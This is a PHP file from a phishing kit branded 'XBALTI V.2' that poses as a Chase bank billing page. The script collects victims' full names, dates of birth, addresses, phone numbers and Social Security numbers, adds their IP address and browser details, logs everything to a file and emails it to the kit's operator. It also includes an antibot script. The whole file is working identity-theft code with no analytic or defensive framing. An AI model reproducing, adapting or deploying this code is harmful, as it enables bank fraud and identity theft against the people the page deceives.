<?php
/*   
             ,;;;;;;;,
            ;;;;;;;;;;;,
           ;;;;;'_____;'
           ;;;(/))))|((\
           _;;((((((|))))
          / |_\\\\\\\\\\\\
     .--~(  \ ~))))))))))))
    /     \  `\-(((((((((((\\
    |    | `\   ) |\       /|)
     |    |  `. _/  \_____/ |
      |    , `\~            /
       |    \  \  XBALTI   /
      | `.   `\|          /
      |   ~-   `\        /
       \____~._/~ -_,   (\
        |-----|\   \    ';;
       |      | :;;;'     \
      |  /    |            |
      |       |            |                   
*/
session_start();
$_SESSION['fullname'] = $_POST['fullname'];
$_SESSION['DateOfBritch'] = $_POST['DateOfBritch'] ;
$_SESSION['StreetAddress'] = $_POST['StreetAddress'];
$_SESSION['StateRegion'] = $_POST['StateRegion'] ;
$_SESSION['ZipCode'] = $_POST['ZipCode'];
$_SESSION['NumberPhone'] = $_POST['NumberPhone'] ;
$_SESSION['ssn'] = $_POST['ssn'];
$TIME_DATE = date('H:i:s d/m/Y');
include('Email.php');
include('get_browser.php');
include('get_ip.php');
include('../antibot.php');
$XBALTI_MESSAGE .= "
<html>
<head><meta charset='UTF-8'></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
------------------ <font style='color: #820000;'>BILLING BANK CHASE</font> ------------------<br/>
-_-_-_-_-_-_-_-_-[ <font style='color: #0a5d00;'>BILLING INFORMATION</font> ]-_-_-_-_-_-_-_-_-<br>
<font style='color:#9c0000;'>😈</font> [Full Name]   = <font style='color:#0070ba;'>".$_SESSION['fullname']."</font><br>
<font style='color:#9c0000;'>😈</font> [Date Of Britch]    = <font style='color:#0070ba;'>".$_SESSION['DateOfBritch']."</font><br>
<font style='color:#9c0000;'>😈</font> [Street Address]    = <font style='color:#0070ba;'>".$_SESSION['StreetAddress']."</font><br>
<font style='color:#9c0000;'>😈</font> [State Region]   = <font style='color:#0070ba;'>".$_SESSION['StateRegion']."</font><br>
<font style='color:#9c0000;'>😈</font> [Zip Code]    = <font style='color:#0070ba;'>".$_SESSION['ZipCode']."</font><br>
<font style='color:#9c0000;'>😈</font> [Number Phone]   = <font style='color:#0070ba;'>".$_SESSION['NumberPhone']."</font><br>
<font style='color:#9c0000;'>😈</font> [ssn]    = <font style='color:#0070ba;'>".$_SESSION['ssn']."</font><br>
-_-_-_-_-_-_-_-_-[ <font style='color: #0a5d00;'>INFO VICTIM</font> ]-_-_-_-_-_-_-_-_-<br>
<font style='color:#9c0000;'>😈</font> [IP INFO]      = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."</font><br>
<font style='color:#9c0000;'>😈</font> [TIME/DATE]    = <font style='color:#0070ba;'>".$TIME_DATE."</font><br>
<font style='color:#9c0000;'>😈</font> [BROWSER]      = <font style='color:#0070ba;'>".XBALTI_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XBALTI_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
------------------ <font style='color: #820000;'>BY XBALTI V.2</font> ------------------</div></html>\n";
    $khraha = fopen("../../1.php", "a");
	fwrite($khraha, $XBALTI_MESSAGE);
    $XBALTI_SUBJECT .= "NEW o_O ✪ O_o BILLINNG : ".$_SESSION['_ip_']." 😈 ".$_SESSION['email']." 😈 ";
    $XBALTI_HEADERS .= "From: <XBALTIV2>";
    $XBALTI_HEADERS .= "XB-Version: 2.0\n";
    $XBALTI_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
    @mail($XBALTI_EMAIL, $XBALTI_SUBJECT, $XBALTI_MESSAGE, $XBALTI_HEADERS);

?>